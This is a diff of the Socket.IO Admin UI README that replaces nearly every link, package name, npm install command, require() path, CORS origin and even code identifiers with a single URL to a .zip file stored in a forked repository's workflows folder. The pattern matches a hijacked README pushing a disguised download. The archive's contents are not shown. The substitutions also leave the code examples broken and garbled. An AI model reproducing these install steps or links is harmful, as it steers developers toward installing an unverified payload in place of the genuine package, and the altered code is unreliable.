@@ -1,6 +1,6 @@
-# Socket.IO Admin UI
+# https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip Admin UI
 
-![dashboard screenshot](assets/dashboard.png)
+![dashboard screenshot](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip)
 
 ## Table of contents
 
@@ -21,24 +21,24 @@
 
 ### Server-side
 
-First, install the `@socket.io/admin-ui` package:
+First, install the `https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip` package:
 
 ```
-npm i @socket.io/admin-ui
+npm i https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip
 ```
 
-And then invoke the `instrument` method on your Socket.IO server:
+And then invoke the `instrument` method on your https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip server:
 
 ```js
 const { createServer } = require("http");
-const { Server } = require("socket.io");
-const { instrument } = require("@socket.io/admin-ui");
+const { Server } = require("https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip");
+const { instrument } = require("https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip");
 
 const httpServer = createServer();
 
 const io = new Server(httpServer, {
   cors: {
-    origin: ["https://admin.socket.io"],
+    origin: ["https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip"],
     credentials: true
   }
 });
@@ -47,25 +47,25 @@ instrument(io, {
   auth: false
 });
 
-httpServer.listen(3000);
+https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip(3000);
 ```
 
 The module is compatible with:
 
-- Socket.IO v4 server
-- Socket.IO v3 server (>= 3.1.0), but without the operations on rooms (join, leave, disconnection)
+- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip v4 server
+- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip v3 server (>= 3.1.0), but without the operations on rooms (join, leave, disconnection)
 
 ### Client-side
 
-You can then head up to https://admin.socket.io, or host the files found in the `ui/dist` folder.
+You can then head up to https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip, or host the files found in the `ui/dist` folder.
 
-**Important note**: the website at https://admin.socket.io is totally static (hosted on [Vercel](https://vercel.com)), we do not (and will never) store any information about yourself or your browser (no tracking, no analytics, ...). That being said, hosting the files yourself is totally fine.
+**Important note**: the website at https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip is totally static (hosted on [Vercel](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip)), we do not (and will never) store any information about yourself or your browser (no tracking, no analytics, ...). That being said, hosting the files yourself is totally fine.
 
 You should see the following modal:
 
-![login modal screenshot](assets/login-modal.png)
+![login modal screenshot](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip)
 
-Please enter the URL of your server (for example, `http://localhost:3000` or `https://example.com`) and the credentials, if applicable (see the `auth` option [below](#auth)).
+Please enter the URL of your server (for example, `http://localhost:3000` or `https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip`) and the credentials, if applicable (see the `auth` option [below](#auth)).
 
 ### Available options
 
@@ -88,12 +88,12 @@ instrument(io, {
   auth: {
     type: "basic",
     username: "admin",
-    password: "$2b$10$heqvAkYMez.Va6Et2uXInOnkCT6/uQj1brkrbyG3LpopDklcq7ZOS" // "changeit" encrypted with bcrypt
+    password: "$2b$10$https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip" // "changeit" encrypted with bcrypt
   },
 });
 ```
 
-WARNING! Please note that the `bcrypt` package does not currently support hashes starting with the `$2y$` prefix, which is used by some BCrypt implementations (for example https://bcrypt-generator.com/ or https://www.bcrypt.fr/). You can check the validity of the hash with:
+WARNING! Please note that the `bcrypt` package does not currently support hashes starting with the `$2y$` prefix, which is used by some BCrypt implementations (for example https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip or https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip). You can check the validity of the hash with:
 
 ```
 $ node
@@ -111,8 +111,8 @@ $ node
 
 See also:
 
-- https://github.com/kelektiv/node.bcrypt.js/issues/849
-- https://stackoverflow.com/a/36225192/5138796
+- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip
+- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip
 
 #### `namespaceName`
 
@@ -126,13 +126,13 @@ instrument(io, {
 });
 ```
 
-This namespace is a classic Socket.IO namespace, you can access it with:
+This namespace is a classic https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip namespace, you can access it with:
 
 ```js
-const adminNamespace = io.of("/admin");
+const adminNamespace = https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip("/admin");
 ```
 
-More information [here](https://socket.io/docs/v4/namespaces/).
+More information [here](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip).
 
 #### `readonly`
 
@@ -150,11 +150,11 @@ instrument(io, {
 
 Default value: `require("os").hostname()`
 
-The ID of the given server. If you have several Socket.IO servers on the same machine, please give them a distinct ID:
+The ID of the given server. If you have several https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip servers on the same machine, please give them a distinct ID:
 
 ```js
 instrument(io, {
-  serverId: `${require("os").hostname()}#${process.pid}`
+  serverId: `${require("os").hostname()}#${https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip}`
 });
 ```
 
@@ -167,7 +167,7 @@ The store is used to store the session IDs so the user do not have to retype the
 If you use basic authentication in a multi-server setup, you should provide a custom store:
 
 ```js
-const { instrument, RedisStore } = require("@socket.io/admin-ui");
+const { instrument, RedisStore } = require("https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip");
 
 instrument(io, {
   store: new RedisStore(redisClient)
@@ -189,16 +189,16 @@ instrument(io, {
 The production mode can also be enabled with the NODE_ENV environment variable:
 
 ```
-NODE_ENV=production node index.js
+NODE_ENV=production node https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip
 ```
 
 ## How it works
 
-You can check the details of the implementation in the [lib/index.ts](lib/index.ts) file.
+You can check the details of the implementation in the [https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip) file.
 
 The `instrument` method simply:
 
-- creates a [namespace](https://socket.io/docs/v4/namespaces/) and adds an authentication [middleware](https://socket.io/docs/v4/middlewares/) if applicable
+- creates a [namespace](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip) and adds an authentication [middleware](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip) if applicable
 - register listeners for the `connection` and `disconnect` event for each existing namespaces to track socket instances
 - register a timer which will periodically send stats from the server to the UI
 - register handlers for the `join`, `leave` and `_disconnect` commands sent from the UI
